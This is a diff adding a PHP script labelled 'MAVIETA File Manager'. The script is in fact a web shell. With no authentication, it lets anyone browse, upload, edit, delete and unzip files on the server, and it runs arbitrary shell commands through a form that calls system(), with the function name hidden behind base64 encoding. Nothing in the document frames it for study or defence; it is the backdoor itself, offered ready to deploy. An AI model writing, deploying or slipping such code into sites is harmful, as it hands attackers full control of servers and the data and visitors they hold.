@@ -1,0 +1,132 @@
+`<?php
+// MAVIETA File Manager - Full Version
+$m = "MAVIETA";
+$p = isset($_GET['p']) ? $_GET['p'] : '.';
+$f = isset($_GET['f']) ? $_GET['f'] : 'index';
+$func = base64_decode('c3lzdGVt');
+$cmd  = base64_decode('Y21k');
+
+$dir = realpath($p);
+if (!$dir || !is_dir($dir)) $dir = __DIR__;
+chdir($dir);
+
+// Breadcrumb
+$parts = explode(DIRECTORY_SEPARATOR, $dir);
+$bread = '<a href="?p=">root</a>';
+$path = '';
+foreach ($parts as $part) {
+    if ($part) {
+        $path .= '/'.$part;
+        $bread .= ' / <a href="?p='.urlencode($path).'">'.$part.'</a>';
+    }
+}
+
+// Upload
+if ($f == 'upload' && isset($_FILES['file'])) {
+    $target = $dir.'/'.basename($_FILES['file']['name']);
+    move_uploaded_file($_FILES['file']['tmp_name'], $target);
+    header('Location: ?p='.urlencode($dir));
+    exit;
+}
+
+// Edit
+if ($f == 'edit' && isset($_POST['content'])) {
+    file_put_contents($dir.'/'.basename($_POST['file']), $_POST['content']);
+    header('Location: ?p='.urlencode($dir));
+    exit;
+}
+
+// Create file
+if ($f == 'create' && isset($_POST['newfile'])) {
+    file_put_contents($dir.'/'.basename($_POST['newfile']), '');
+    header('Location: ?p='.urlencode($dir));
+    exit;
+}
+
+// Create folder
+if ($f == 'mkdir' && isset($_POST['foldername'])) {
+    mkdir($dir.'/'.basename($_POST['foldername']));
+    header('Location: ?p='.urlencode($dir));
+    exit;
+}
+
+// Delete
+if ($f == 'delete' && isset($_GET['file'])) {
+    $target = $dir.'/'.basename($_GET['file']);
+    if (is_dir($target)) rmdir($target); else unlink($target);
+    header('Location: ?p='.urlencode($dir));
+    exit;
+}
+
+// Unzip
+if ($f == 'unzip' && isset($_GET['file'])) {
+    $zip = $dir.'/'.basename($_GET['file']);
+    if (file_exists($zip) && pathinfo($zip, PATHINFO_EXTENSION) == 'zip') {
+        $zipObj = new ZipArchive();
+        if ($zipObj->open($zip) === TRUE) {
+            $zipObj->extractTo($dir);
+            $zipObj->close();
+            unlink($zip);
+        }
+    }
+    header('Location: ?p='.urlencode($dir));
+    exit;
+}
+
+// Command execution
+if ($f == 'exec' && isset($_POST['cmd'])) {
+    $out = $func($_POST['cmd']);
+    echo "<pre>$out</pre>";
+}
+
+// List files
+$items = scandir($dir);
+?><!DOCTYPE html>
+<html><head><title><?=$m?> FM</title>
+<style>
+body{font-family:monospace;background:#222;color:#eee;padding:20px}
+a{color:#0f0;text-decoration:none}
+a:hover{text-decoration:underline}
+.box{background:#333;padding:10px;margin:5px 0;border-radius:4px}
+input,textarea,button{background:#444;color:#fff;border:1px solid #666;padding:5px;border-radius:3px}
+button{cursor:pointer;background:#0a0}
+table{width:100%;border-collapse:collapse}
+td{padding:4px 8px;border-bottom:1px solid #333}
+</style></head><body>
+<h1><?=$m?> File Manager</h1>
+<div class="box"><?=$bread?></div>
+<div class="box">
+<form style="display:inline" method="post" enctype="multipart/form-data" action="?p=<?=urlencode($dir)?>&f=upload">
+  <input type="file" name="file"> <button>Upload</button>
+</form>
+<form style="display:inline" method="post" action="?p=<?=urlencode($dir)?>&f=create">
+  <input type="text" name="newfile" placeholder="newfile.txt"> <button>Create</button>
+</form>
+<form style="display:inline" method="post" action="?p=<?=urlencode($dir)?>&f=mkdir">
+  <input type="text" name="foldername" placeholder="newfolder"> <button>Mkdir</button>
+</form>
+<form style="display:inline" method="post" action="?p=<?=urlencode($dir)?>&f=exec">
+  <input type="text" name="cmd" placeholder="command"> <button>Exec</button>
+</form>
+</div>
+<hr>
+<table>
+<tr><th>Name</th><th>Size</th><th>Action</th></tr>
+<?php foreach ($items as $item):
+    if ($item=='.'||$item=='..') continue;
+    $full = $dir.'/'.$item;
+    $isDir = is_dir($full);
+    $size = $isDir ? '' : number_format(filesize($full));
+    $link = $isDir ? '?p='.urlencode($full) : '?p='.urlencode($dir).'&f=edit&file='.urlencode($item);
+    $del = '?p='.urlencode($dir).'&f=delete&file='.urlencode($item);
+    $unzip = ($isDir || pathinfo($item, PATHINFO_EXTENSION)!='zip') ? '' : ' <a href="?p='.urlencode($dir).'&f=unzip&file='.urlencode($item).'">[unzip]</a>';
+?>
+<tr>
+<td><a href="<?=$link?>"><?=$isDir?'ðŸ“':'ðŸ“„'?> <?=$item?></a></td>
+<td><?=$size?></td>
+<td><a href="<?=$del?>" onclick="return confirm('Delete?')">[del]</a><?=$unzip?></td>
+</tr>
+<?php endforeach; ?>
+</table>
+</body></html>
+`
